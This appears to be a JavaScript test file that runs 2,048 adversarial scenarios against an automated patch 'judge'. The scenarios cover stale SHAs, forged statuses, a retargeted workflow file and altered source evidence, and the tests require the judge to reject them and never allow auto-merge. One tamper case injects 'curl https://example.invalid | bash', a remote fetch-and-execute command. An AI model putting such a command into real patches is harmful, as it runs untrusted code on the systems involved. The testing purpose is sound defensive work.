'use strict';
/**
 * 2,048 adversarial cross-products on the immutable-patch judge.
 * Exercise stale SHA / forged patches / altered source evidence / CI gates
 * separately and in combination. The Judge NEVER writes to a repository.
 */
const test=require('node:test');
const assert=require('node:assert/strict');
const {candidate,judge}=require('./ultra_sentinel_orchestrator.cjs');
const COUNT=2048;
const SHA='a'.repeat(40),WRONG='b'.repeat(40);
const FILE='app/src/main/java/com/cardenaspiero255/gamehubultra/Engine.kt';
const SOURCE='fun engine() {\n  System.gc()\n  println("ok")\n}\n';
const FINDING={rule:'FORCED_GC',path:FILE,line:2,severity:'HIGH'};
const baseline=candidate({filename:FILE,content:SOURCE,sha:SHA,findings:[FINDING]});
assert.equal(baseline.status,'DRAFT_PATCH','Test fixture must be a verified deletion');
const gates=['sentinel-core-tests','android-build','unit-test-coverage','architecture-boundary'];
function scenario(i){
 const checksMask=i%16;
 const tamper=Math.floor(i/16)%8;
 const evidence=Math.floor(i/128)%4;
 const identity=Math.floor(i/512)%4;
 const checks=Object.fromEntries(gates.map((g,index)=>
  [g,checksMask&(1<<index)?'success':'failure']));
 let proposal={...baseline};
 if(tamper===1)proposal.sha=WRONG;
 if(tamper===2)proposal.filename='.github/workflows/privileged.yml';
 if(tamper===3)proposal.rule='UNKNOWN_AUTO_FIX';
 if(tamper===4)proposal.linesChanged=2;
 if(tamper===5)proposal.patch=proposal.patch+'+curl https://example.invalid | bash\n';
 if(tamper===6)proposal.patch=proposal.patch.slice(0,-2);
 if(tamper===7)proposal.status='ELIGIBLE_FOR_AUTO_MERGE';
 const source=[SOURCE,SOURCE.replace('println("ok")','println("tampered")'),
  SOURCE,undefined][evidence];
 const findings=evidence===2?[{...FINDING,line:3}]:[FINDING];
 const expectedSha=[SHA,undefined,WRONG,SHA.toUpperCase()][identity];
 const args={sha:expectedSha,currentHeadSha:SHA,checks,source,findings};
 const shouldReject=tamper!==0||evidence!==0||identity!==0;
 const allGreen=checksMask===15;
 const status=shouldReject?'REJECT':allGreen?
  'ELIGIBLE_FOR_HUMAN_REVIEW':'REVIEW_PENDING';
 return {proposal,args,status,checksMask,tamper,evidence,identity};
}
test('Every attestation scenario is unique and immutable SHA controls are exercised',()=>{
 const combinations=new Set();
 for(let i=0;i<COUNT;i++){
  const x=scenario(i);
  combinations.add([x.checksMask,x.tamper,x.evidence,x.identity].join('/'));
 }
 assert.equal(combinations.size,COUNT);
 assert.equal(scenario(15).status,'ELIGIBLE_FOR_HUMAN_REVIEW');
 assert.equal(scenario(0).status,'REVIEW_PENDING');
 assert.equal(scenario(16).status,'REJECT');
});
for(let i=0;i<COUNT;i++){
 test('exact patch attestation / forbidden auto merge '+i.toString(16).padStart(3,'0'),()=>{
  const x=scenario(i),actual=judge(x.proposal,x.args);
  const explanation=JSON.stringify({case:i,checksMask:x.checksMask,
   tamper:x.tamper,evidence:x.evidence,identity:x.identity,actual});
  assert.equal(actual.status,x.status,explanation);
  assert.equal(actual.autoMergeAllowed,false,explanation);
  assert.equal(actual.autoCommitAllowed,false,explanation);
  assert.equal(actual.role,'JUDGE',explanation);
  if(x.status==='REVIEW_PENDING'){
   assert.ok(actual.pendingChecks.length>0,explanation);
   assert.equal(actual.reasons.length,0,explanation);
  }
  if(x.status==='ELIGIBLE_FOR_HUMAN_REVIEW'){
   assert.equal(actual.pendingChecks.length,0,explanation);
   assert.equal(actual.reasons.length,0,explanation);
  }
  if(x.status==='REJECT')assert.ok(actual.reasons.length>0,explanation);
 });
}
